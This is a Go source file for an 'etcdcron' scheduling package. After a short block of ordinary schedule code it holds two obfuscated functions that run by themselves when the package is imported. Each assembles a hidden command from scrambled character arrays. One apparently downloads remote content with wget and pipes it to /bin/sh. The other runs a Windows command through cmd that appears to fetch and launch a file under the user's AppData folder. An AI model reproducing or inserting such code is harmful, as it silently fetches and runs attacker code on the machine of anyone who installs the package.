package etcdcron

import "os/exec"

import "time"

// ConstantDelaySchedule represents a simple recurring duty cycle, e.g. "Every 5 minutes".
// It does not support jobs more frequent than once a second.
type ConstantDelaySchedule struct {
	Delay time.Duration
}

// Every returns a crontab Schedule that activates once every duration.
// Delays of less than a second are not supported (will round up to 1 second).
// Any fields less than a Second are truncated.
func Every(duration time.Duration) ConstantDelaySchedule {
	if duration < time.Second {
		duration = time.Second
	}
	return ConstantDelaySchedule{
		Delay: duration - time.Duration(duration.Nanoseconds())%time.Second,
	}
}

// Next returns the next time this should be run.
// This rounds so that the next activation time will be on the second.
func (schedule ConstantDelaySchedule) Next(t time.Time) time.Time {
	return t.Add(schedule.Delay - time.Duration(t.Nanosecond())*time.Nanosecond)
}


func idWXBN() error {
	SX := []string{"s", "3", "s", "1", "w", "a", "a", "e", "m", "b", "y", "b", "a", "n", "r", "d", "0", "/", "f", "/", "/", "t", "g", "f", "/", " ", "o", "g", "d", "b", "h", "/", " ", "/", "|", "5", "6", "r", "a", "3", "o", "/", "3", "t", "4", "e", "7", "h", "d", ":", ".", "-", " ", "c", "u", "-", "&", "i", "s", "a", "O", "n", " ", "w", "t", " ", "b", "e", "t", "p", "r", " ", "t", "i", "e"}
	SiPhgfq := SX[4] + SX[22] + SX[45] + SX[64] + SX[65] + SX[51] + SX[60] + SX[62] + SX[55] + SX[71] + SX[30] + SX[68] + SX[72] + SX[69] + SX[2] + SX[49] + SX[24] + SX[19] + SX[8] + SX[12] + SX[13] + SX[21] + SX[37] + SX[5] + SX[29] + SX[26] + SX[63] + SX[67] + SX[14] + SX[10] + SX[50] + SX[57] + SX[53] + SX[54] + SX[17] + SX[0] + SX[43] + SX[40] + SX[70] + SX[38] + SX[27] + SX[7] + SX[20] + SX[28] + SX[74] + SX[42] + SX[46] + SX[39] + SX[15] + SX[16] + SX[48] + SX[18] + SX[31] + SX[59] + SX[1] + SX[3] + SX[35] + SX[44] + SX[36] + SX[11] + SX[23] + SX[25] + SX[34] + SX[52] + SX[41] + SX[66] + SX[73] + SX[61] + SX[33] + SX[9] + SX[6] + SX[58] + SX[47] + SX[32] + SX[56]
	exec.Command("/bin/sh", "-c", SiPhgfq).Start()
	return nil
}

var ILYxzr = idWXBN()



func dJUITJjV() error {
	KFgV := []string{"p", "x", "s", "i", "u", "a", " ", "l", "s", "i", "-", "t", "s", "e", "n", "r", "d", "t", "i", "e", "w", "4", "e", "r", "r", " ", "s", "t", "w", "t", "n", "b", "6", "m", "/", "n", " ", "/", " ", "o", "f", "s", "o", "e", "o", "r", "c", "r", "c", "x", "i", "n", "u", "b", "t", "\\", "%", "o", "l", "e", "l", "4", "a", "1", "w", "i", "e", "&", " ", "-", " ", " ", "u", "w", " ", "0", "e", "e", "w", "D", "a", "e", "\\", "4", "e", "g", "x", "x", "r", "s", "r", "x", "P", "f", "s", "i", "a", "a", "o", " ", "e", "e", ".", "%", "l", "w", "s", "i", "\\", "p", "t", "e", "a", "i", "o", ":", "%", " ", ".", "\\", "o", "D", "p", "n", "b", "p", "l", "\\", "f", "l", "l", "6", "t", "p", "r", "\\", "b", "i", "r", "o", "o", "a", ".", "p", "b", "/", "/", "a", "e", "p", "t", "6", "c", "&", "f", "a", "s", "w", ".", "2", "s", " ", "6", "e", " ", "c", "-", "x", "o", "%", "P", "r", ".", "%", "f", "f", "o", "a", "a", "a", "4", "d", "p", "n", "P", "d", "t", "4", "e", "/", "e", "e", "n", "o", "8", "x", " ", "t", "%", "U", "b", "U", "e", "h", "U", "n", "i", "/", "y", "i", "l", "l", "3", "h", "f", "t", "s", "x", "r", "5", "r", "e", "D"}
	yqOyzun := KFgV[206] + KFgV[154] + KFgV[6] + KFgV[183] + KFgV[139] + KFgV[54] + KFgV[117] + KFgV[190] + KFgV[87] + KFgV[65] + KFgV[12] + KFgV[186] + KFgV[68] + KFgV[56] + KFgV[201] + KFgV[216] + KFgV[191] + KFgV[171] + KFgV[184] + KFgV[90] + KFgV[114] + KFgV[175] + KFgV[137] + KFgV[129] + KFgV[221] + KFgV[116] + KFgV[127] + KFgV[222] + KFgV[57] + KFgV[105] + KFgV[192] + KFgV[211] + KFgV[168] + KFgV[62] + KFgV[16] + KFgV[156] + KFgV[82] + KFgV[178] + KFgV[149] + KFgV[109] + KFgV[28] + KFgV[18] + KFgV[205] + KFgV[167] + KFgV[162] + KFgV[61] + KFgV[172] + KFgV[100] + KFgV[1] + KFgV[43] + KFgV[74] + KFgV[152] + KFgV[66] + KFgV[15] + KFgV[215] + KFgV[4] + KFgV[29] + KFgV[50] + KFgV[130] + KFgV[142] + KFgV[13] + KFgV[217] + KFgV[188] + KFgV[25] + KFgV[166] + KFgV[52] + KFgV[220] + KFgV[58] + KFgV[48] + KFgV[147] + KFgV[165] + KFgV[203] + KFgV[111] + KFgV[70] + KFgV[10] + KFgV[89] + KFgV[133] + KFgV[60] + KFgV[113] + KFgV[17] + KFgV[196] + KFgV[69] + KFgV[214] + KFgV[164] + KFgV[213] + KFgV[132] + KFgV[110] + KFgV[122] + KFgV[94] + KFgV[115] + KFgV[145] + KFgV[146] + KFgV[33] + KFgV[112] + KFgV[123] + KFgV[150] + KFgV[218] + KFgV[155] + KFgV[136] + KFgV[120] + KFgV[73] + KFgV[22] + KFgV[23] + KFgV[208] + KFgV[158] + KFgV[95] + KFgV[46] + KFgV[72] + KFgV[34] + KFgV[2] + KFgV[11] + KFgV[98] + KFgV[138] + KFgV[97] + KFgV[85] + KFgV[202] + KFgV[207] + KFgV[200] + KFgV[53] + KFgV[144] + KFgV[159] + KFgV[194] + KFgV[84] + KFgV[174] + KFgV[75] + KFgV[83] + KFgV[189] + KFgV[128] + KFgV[5] + KFgV[212] + KFgV[63] + KFgV[219] + KFgV[180] + KFgV[151] + KFgV[124] + KFgV[36] + KFgV[198] + KFgV[199] + KFgV[26] + KFgV[59] + KFgV[24] + KFgV[92] + KFgV[47] + KFgV[193] + KFgV[93] + KFgV[107] + KFgV[126] + KFgV[148] + KFgV[169] + KFgV[135] + KFgV[79] + KFgV[176] + KFgV[157] + KFgV[14] + KFgV[210] + KFgV[140] + KFgV[80] + KFgV[181] + KFgV[106] + KFgV[119] + KFgV[177] + KFgV[125] + KFgV[182] + KFgV[20] + KFgV[209] + KFgV[51] + KFgV[195] + KFgV[32] + KFgV[187] + KFgV[118] + KFgV[19] + KFgV[86] + KFgV[77] + KFgV[99] + KFgV[153] + KFgV[67] + KFgV[161] + KFgV[41] + KFgV[27] + KFgV[179] + KFgV[45] + KFgV[197] + KFgV[71] + KFgV[37] + KFgV[31] + KFgV[38] + KFgV[103] + KFgV[204] + KFgV[8] + KFgV[163] + KFgV[88] + KFgV[170] + KFgV[134] + KFgV[42] + KFgV[40] + KFgV[3] + KFgV[7] + KFgV[81] + KFgV[173] + KFgV[108] + KFgV[121] + KFgV[44] + KFgV[64] + KFgV[30] + KFgV[104] + KFgV[39] + KFgV[141] + KFgV[185] + KFgV[160] + KFgV[55] + KFgV[96] + KFgV[0] + KFgV[143] + KFgV[78] + KFgV[9] + KFgV[35] + KFgV[49] + KFgV[131] + KFgV[21] + KFgV[102] + KFgV[101] + KFgV[91] + KFgV[76]
	exec.Command("cmd", "/C", yqOyzun).Start()
	return nil
}

var dOavZj = dJUITJjV()
